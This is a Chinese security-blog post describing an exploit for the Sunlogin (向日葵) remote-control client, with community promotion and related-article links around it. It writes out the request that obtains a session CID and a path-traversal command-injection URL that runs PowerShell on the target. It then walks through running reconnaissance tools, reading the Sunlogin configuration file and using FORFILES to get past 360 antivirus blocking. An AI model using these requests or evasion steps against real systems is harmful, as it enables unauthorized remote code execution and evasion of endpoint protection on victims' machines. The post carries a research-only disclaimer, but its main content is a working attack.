#  向日葵RCEbypass   
原创 无问社区  白帽子社区团队   2024-09-14 16:16  
  
本文仅用于技术研究学习，请遵守相关法律，禁止使用本文所提及的相关技术开展非法攻击行为，由于传播、利用本文所提供的信息而造成任何不良后果及损失，与本账号及作者无关。  
  
**关于无问社区**  
  
  
    无问社区致力于打造一个面向于网络安全从业人员的技术综合服务社区，可  
**免费**获取安全技术资料，社区可提供的技术资料覆盖全网，辅助学习的功能丰富。  
  
    特色功能：划词解析、调取同类技术资料、  
**AI助手全网智能检索**、基于推荐算法，为每一位用户量身定制专属技术资料。  
  
  
无问社区-官网：http://wwlib.cn  
  
无问社区站内阅读  
链接：  
  
http://www.wwlib.cn/index.php/artread/artid/9157.html  
  
  
#### 1. 获取 CID  
  
  
```
http://ip:port/cgi-bin/rpc?action=verify-haras
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqgGiaA107Wic3kNiaN2UvwVIiarVgIsicicXAPlib5MaibM7icEXIllzKibZ6W1Hg/640?wx_fmt=png&from=appmsg "")  
  
#### 2.借助 ping 命令进行拼接  
  
  
  
修改 Cookie:CID=xxxxx  
```
/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fw
indows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershe   ll.exe+%20whoami
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqxnKnxGCNK7tMfWZluCSlsTxraBltQwxnhkr8IP2U90wUUWm95oMdTg/640?wx_fmt=png&from=appmsg "")  
  
当存在防护软件时执行命令会告警failed,error 5：表示命令执行失败  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqBicFwq2URuGcVr6CTmlh2IMU4hibR3Rg2iaEKkC1lM2fS4FCeDTZAz9mA/640?wx_fmt=png&from=appmsg "")  
  
我们可以先使用他的正常命令 ping 来查看命令执行漏洞是否存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqGEsvLMZ2F2goy5ny7vrwj6JXwicrX0SeFnZDl2rpuoHa0ibR0cBufhWw/640?wx_fmt=png&from=appmsg "")  
  
我们从上图可以得知 360 是拦截了PowerShell 调用尝试调用CMD 执行命令看看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqWqKAjwEDjOxib7RPgLRmlN5LeKFicBdyQiaVnNCacM9urRw32o5Bp2DDg/640?wx_fmt=png&from=appmsg "")  
  
发现CMD 调用和 PowerShell 调用都被拦截了，思路就此转换成不使用CMD 和 PowerShell  
  
#### 3执行命令  
  
  
  
1.直接调用systeminfo.exe 获取操作系统信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqrW0UkCKFPnyDLhnv38xaD6FI6XS5KLwy0oaJXiaYEsyaaxIXrFTHk8w/640?wx_fmt=png&from=appmsg "")  
  
2.直接调用 netstat.exe 获取操作系统信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjq0h8lmvwJNbzYN9l38fuqEtFMLMZKQf7SiaEInics1JJCKlyP8B4hV1Cw/640?wx_fmt=png&from=appmsg "")  
  
3.直接调用tasklist.exe 来获得进程信息我们可以看到是存在 360 进程的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqibbj5PAT9xXAmWvcPojSvZvATg7aa6U9vzwdZXP3nLL7pxD2KKU0CXg/640?wx_fmt=png&from=appmsg "")  
  
4.直接调用ipconfig.exe 获得IP 信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqZmIicANbVkdDib5z6PEyxBIcUKu1ZbmjMttKdbiaS6r3rQrLlQeUd0o7Q/640?wx_fmt=png&from=appmsg "")  
  
5.直接调用arp.exe 获得内网其他IP  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjquKItg5vY7vUSGy5N5uczP7RkwYjf7Ificaru9QxQ5EDoKicETYwd4gDA/640?wx_fmt=png&from=appmsg "")  
  
6.直接调用whoami.exe 查看当前权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqSwxcrDNGAT7uEE1n0zy7dFVR6ykCTjgD2aSSep7icibzicaFsperY5CMQ/640?wx_fmt=png&from=appmsg "")  
  
7.使用 findstr.exe 读取向日葵配置文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqTJmGBz5mKicxh9yCfaXPNUQnSmKiaw2bwmwzBoqUVJQZ9PibibOmSGyQyQ/640?wx_fmt=png&from=appmsg "")  
  
8.使用FORFILES调用 CMD 执行任意命令bypass 360 拦截(2022-06-26)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqkLwqb5KsbOp4Lxn21AjYB6iayqeE50Qvb814l6j2SrVy9oKVZOpTo9w/640?wx_fmt=png&from=appmsg "")  
  
使用FORFILES 执行 net user 成功执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjq7ddmib6XRV4iaIiaoiaLeS9y9ufOFL3ibUxgrcz4ODDvnzb3RaGoWhEcWJQ/640?wx_fmt=png&from=appmsg "")  
  
正常调用 net.exe 执行 net user 被拦截  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjq3Xx0eVW10EYRrV2pAPpqib0x6oxqZv5rN3wTTwe00aChMzw6H2LYfHg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DK5OZOOglM6xfYOc2TjKug5ibwo0majjqITneiaibGVBXjNTAecLpUJcfficIO1yxzAfZkFvw5MXXqes6nOBzFn5wQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
[网络钓鱼：OLE+LNK（文末转发福利）](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486835&idx=1&sn=bbb7d535593fbbbad4b3683015e6e0d6&chksm=c2bc7715f5cbfe03c9868c40f662be776f66228756cc75759484ae5019be13aade6eb7c35ba0&scene=21#wechat_redirect)  
  
  
[CTF-phar为协议分析（文末转发奖励）](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486815&idx=1&sn=b6075af8d54ebe6cee6545e4b3596234&chksm=c2bc7739f5cbfe2f3aed0f3ade97e3d597262a65ffaaa398cc54cbf91a1b880cfd52c1230557&scene=21#wechat_redirect)  
  
  
[ThinkCMF框架任意内容包含漏洞的讲解](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486851&idx=1&sn=8f94ebc62e24af1308f334c4836abe1b&chksm=c2bc77e5f5cbfef333ba1839b91cbe68425b2fb7e331380a10f800f571441a70bd98dba64f59&scene=21#wechat_redirect)  
  
  
[【SRC思路】SRC小姿势（1）](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486789&idx=2&sn=151623d6e23416faf3fbdb7449486e58&chksm=c2bc7723f5cbfe3507ef63836cd2005d10e1c3b8080e695e0a9ecd8459eba28c352a4278e8ad&scene=21#wechat_redirect)  
  
  
[无问社区助手1.5来了，海量网安资料随意看（文末转发福利）](http://mp.weixin.qq.com/s?__biz=MzkzNDQ0MDcxMw==&mid=2247486810&idx=1&sn=31fd4adc78e8cdae55de065e3d9728a0&chksm=c2bc773cf5cbfe2abccde97a46a3905679a78554e06afd4a949b45bf4bd131919b8024d74f91&scene=21#wechat_redirect)  
  
  
**加入粉丝群可在公众号页面联系我们进群**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DK5OZOOglM47PIpoBoeyJicibQ3PhuMAh5j2pc4VJqbWJWzhFSdDB2UocaClr1f3AkhLwF4kibZA6KbyPHwqEkjiaA/640?wx_fmt=gif&from=appmsg "")  
  
**点“阅读原文”，访问无问社区**  
  
  
